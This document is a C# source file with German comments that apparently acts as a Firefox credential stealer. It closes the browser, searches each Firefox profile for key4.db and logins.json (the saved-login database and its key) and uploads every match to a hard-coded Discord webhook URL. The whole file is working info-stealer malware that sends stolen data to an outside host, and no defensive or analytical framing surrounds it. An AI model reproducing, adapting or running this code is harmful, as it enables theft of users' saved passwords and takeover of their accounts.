using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Net.Http;
using System.Security.AccessControl;
using System.Reflection.Metadata;
/////////////////////////////////
using Main;

namespace FirefoxEX
{
    public class Firefox
    {
        public async Task Start()
        {

            // Verzeichnis erstellen oder zurücksetzen
            DirectoryInfo dir = new DirectoryInfo(@"%temp%\a74Bas57M");
            try
            {
                if (dir.Exists)
                {
                    dir.Attributes = dir.Attributes & ~FileAttributes.ReadOnly;
                    dir.Delete(true);
                }
                dir.Create();
                Console.Write("Verzeichnis erstellt.");
            }
            catch (Exception)
            {

            }

            //Firefox Check ob es geschlossen ist
            if (File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
            {
                if (IsFirefoxRunning())
                {
                    Console.WriteLine("Firefox is running. Closing Firefox...");
                    CloseFirefox();
                    Thread.Sleep(2000);
                }
                else
                {
                    Console.WriteLine("Firefox is not running. Opening Firefox...");
                    OpenFirefox();
                    Thread.Sleep(2000);
                    Console.WriteLine("Closing Firefox...");
                    CloseFirefox();
                    Thread.Sleep(2000);
                }


                static bool IsFirefoxRunning()
                {
                    Process[] processes = Process.GetProcessesByName("firefox");
                    return processes.Length > 0;
                }

                static void CloseFirefox()
                {
                    Process[] processes = Process.GetProcessesByName("firefox");
                    foreach (Process process in processes)
                    {
                        process.CloseMainWindow();
                        process.WaitForExit();
                    }
                }

                static void OpenFirefox()
                {
                    Process.Start(@"C:\Program Files\Mozilla Firefox\firefox.exe");
                }

                // Unterordner checken
                string Sdir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
                string Ddir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "a74Bas57M", "Profiles");

                if (!Directory.Exists(Ddir))
                {
                    Directory.CreateDirectory(Ddir);
                    Console.WriteLine("Verzeichnis erstellt.");
                }

                try
                {
                    string webhookLink = "https://discord.com/api/webhooks/1101951462344499292/wdsO702hdrfl08Zcw0CYxUfyZ12CyTsiRn8ll3mWf9mlpEY3Ar8CR0Cmo5nInSZ_ADZp";
                    string profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");

                    using (HttpClient httpClient = new HttpClient())
                    {
                        var dirs2 = new DirectoryInfo(profileDir).GetDirectories();
                        foreach (var subdir in dirs2)
                        {
                            var files = subdir.GetFiles("key4.db", SearchOption.AllDirectories)
                                .Union(subdir.GetFiles("logins.json", SearchOption.AllDirectories));
                            foreach (var file in files)
                            {
                                string filePath = Path.Combine(subdir.FullName, file.Name);

                                using (var form = new MultipartFormDataContent())
                                {
                                    var fileBytes = System.IO.File.ReadAllBytes(filePath);
                                    form.Add(new ByteArrayContent(fileBytes, 0, fileBytes.Length), "Data Base File", file.Name);
                                    var response = await httpClient.PostAsync(webhookLink, form);

                                    // optional: überprüfen, ob der Webhook erfolgreich war
                                    if (response.IsSuccessStatusCode)
                                    {
                                        Console.WriteLine($"Datei {file.Name} erfolgreich kopiert.");
                                    }
                                    else
                                    {
                                        Console.WriteLine($"Fehler beim Hochladen der Datei {file.Name}: {response.StatusCode}");
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Fehler beim Hochladen der Datei: {ex.Message}");
                }
            }
        }
    }
}

